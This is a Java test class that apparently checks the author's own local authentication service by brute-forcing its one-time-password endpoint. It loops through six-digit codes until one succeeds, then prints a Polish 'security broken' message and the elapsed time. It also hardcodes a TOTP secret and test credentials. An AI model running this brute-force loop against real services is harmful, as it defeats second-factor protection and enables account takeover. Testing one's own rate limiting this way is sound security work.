package com.app.auth;


import com.app.auth.model.communication.AuthenticationString;
import com.app.auth.model.communication.request.AndroidAuthRequest;
import com.app.auth.model.communication.request.CredentialsAuthRequest;
import com.app.auth.model.communication.request.GetSessionRequest;
import com.app.auth.model.communication.request.OtpRequest;
import com.app.auth.service.util.TotpUtils;
import com.google.gson.Gson;

import javax.crypto.Cipher;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.KeyFactory;
import java.security.PublicKey;
import java.security.spec.X509EncodedKeySpec;
import java.util.concurrent.TimeUnit;

import org.h2.util.json.JSONObject;

public class Test {

    public static void main(String[] args) throws IOException, InterruptedException {
        Gson gson = new Gson();
        String totpSecret = "Z73VZ4XSWFOG2O4F";
        String deviceId = "ee04f6f1-0d95-4eeb-bd54-0c323fe90e89";
        String rsaPublic = "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAjZEm3+ias/r/2d1vfFSqdeh2SSEcXsANPY/USncnpjFibYOoZkXvjKfaJ3/J2hE2uNy50mO+oFZ+Xob8bF6MEHZv+zDcPqU6c8ZDd0gBfRJq8dkPuSz8ixEHvagvmLdVCnRj7qJoQDRILYX9et96XO6BqewzWlF1/XozFSrIK8RTbesIUyfRwN1Hezou1E8VGkAKpOl+gQGbXCofEGPJVaRJIN9hX0Yivi4vfl35g7DWHwHcJmhaxsAGQXDkPt9QTNb3pwAqDxzDRsbYadeNdltmxdKm+/B/EL3vhEktQ9zYdZ9WIJKW3zuxlUJyK15IR4bMY7bPvOYQW20TQOzyRwIDAQAB";
        OtpRequest otpRequest = new OtpRequest();
        GetSessionRequest getSessionRequest = new GetSessionRequest();
        AuthenticationString authenticationString = new AuthenticationString();
        URL firstFactorUrl = new URL("http://localhost:8080/api/auth/login");
        URL otpUrl = new URL("http://localhost:8080/api/auth/otp");
        URL sessionUrl = new URL("http://localhost:8080/api/auth/android/session");
        URL androidAuthUrl = new URL("http://localhost:8080/api/auth/android/authenticate");
        URL biomAuthUrl = new URL("http://localhost:8080/api/auth/auth-biometric");


        String password = "password";
        String username = "test0";
        CredentialsAuthRequest authRequest = new CredentialsAuthRequest();
        authRequest.setUsername(username);
        authRequest.setPassword(password);

        HttpURLConnection httpURLConnection = (HttpURLConnection) firstFactorUrl.openConnection();
        httpURLConnection.setRequestMethod("POST");
        httpURLConnection.setRequestProperty("Content-Type", "application/json");
        httpURLConnection.setDoOutput(true);
        String body = gson.toJson(authRequest);

        httpURLConnection.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));

        String jwt = httpURLConnection.getHeaderField(4);
        httpURLConnection.disconnect();

        long timeStart = System.currentTimeMillis();
        long timeStop = 0;
        for(int i=100000; i<999999; i++){

//            getSessionRequest.setUsername(username+i);
//            getSessionRequest.setDeviceId(encrypt(deviceId+System.currentTimeMillis(), rsaPublic));
//
//            httpURLConnection = (HttpURLConnection) sessionUrl.openConnection();
//            httpURLConnection.setRequestMethod("POST");
//            httpURLConnection.addRequestProperty("ania-app",jwt);
//            httpURLConnection.setRequestProperty("Content-Type", "application/json");
//            httpURLConnection.setDoOutput(true);
//            body = gson.toJson(getSessionRequest);
//
//            httpURLConnection.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
//            String sessionId = httpURLConnection.getHeaderField(1);
//            authenticationString.setDeviceId(deviceId);
//            authenticationString.setSessionId(sessionId);
//            String encrypted = encrypt(gson.toJson(authenticationString), rsaPublic);
//
//            AndroidAuthRequest androidAuthRequest = new AndroidAuthRequest(username+i, encrypted);
//
//            HttpURLConnection httpURLConnection = (HttpURLConnection) androidAuthUrl.openConnection();
//            httpURLConnection.setRequestMethod("POST");
//            httpURLConnection.setRequestProperty("Content-Type", "application/json");
//            httpURLConnection.setDoOutput(true);
//            body = gson.toJson(androidAuthRequest);


            otpRequest.setOtp(i);
            httpURLConnection = (HttpURLConnection) otpUrl.openConnection();
            httpURLConnection.setRequestProperty("Cookie",jwt);
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setRequestProperty("Content-Type", "application/json");
            httpURLConnection.setDoOutput(true);

            body = gson.toJson(otpRequest);

            httpURLConnection.getOutputStream().write(body.getBytes(StandardCharsets.UTF_8));
            if(httpURLConnection.getHeaderField(4).startsWith("ania")) {
                System.out.println("Złamano zabezpieczenia");
                timeStop = System.currentTimeMillis();
                long elapsedTime = timeStop - timeStart;
                long elapsedSeconds = elapsedTime / 1000;
                long elapsedMinutes = elapsedSeconds / 60;
                System.out.println(elapsedSeconds);
                System.out.println(elapsedMinutes);
                break;
            }

            httpURLConnection.disconnect();
            TimeUnit.MILLISECONDS.sleep(10);

        }
    }

    public static String encrypt(String message, String key) {
        try {
            byte[] publicKeyByte = java.util.Base64.getDecoder().decode(key);
            X509EncodedKeySpec keySpec = new X509EncodedKeySpec(publicKeyByte);
            KeyFactory keyFactory = KeyFactory.getInstance("RSA");
            PublicKey publicKey = keyFactory.generatePublic(keySpec);

            Cipher cipher = Cipher.getInstance("RSA/ECB/PKCS1Padding");
            cipher.init(Cipher.ENCRYPT_MODE, publicKey);

            byte[] encryptedBytes = cipher.doFinal(message.getBytes());
            return java.util.Base64.getEncoder().encodeToString(encryptedBytes);
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

}
